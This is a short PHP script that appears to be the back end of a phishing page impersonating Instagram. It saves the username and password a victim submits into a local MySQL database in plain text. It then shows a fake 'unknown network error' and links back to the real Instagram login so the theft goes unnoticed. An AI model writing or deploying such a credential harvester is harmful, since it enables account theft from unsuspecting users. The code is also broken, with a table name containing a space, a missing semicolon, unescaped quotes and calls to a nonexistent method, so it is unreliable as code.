<?php
    $username = $_POST['username'];
    $password = $_POST['password'];

    //Database connection
    $conn = new mysqli('localhost','root','','sunnydeepu');
    if ($conn->connect_error) {
    	die('connection Failed : ' .$conn->connect_error);
    }else{
    	$stmt = $conn->prepare("insert into log in (username,password) values( ?,?) ");
    	$stmt->bind_param("ss",$username,$password);
    	$stmt->execute();
    	echo " <h3><p>Error</p></h3>
        <h4><br> An unknown network error</h4>
        <h4> has occured </h4>
        <br> <a href="https://www.instagram.com/accounts/login/"  >   Try again </a>"
        $stmt-> open();
        $stmt->open();


    }
    
?>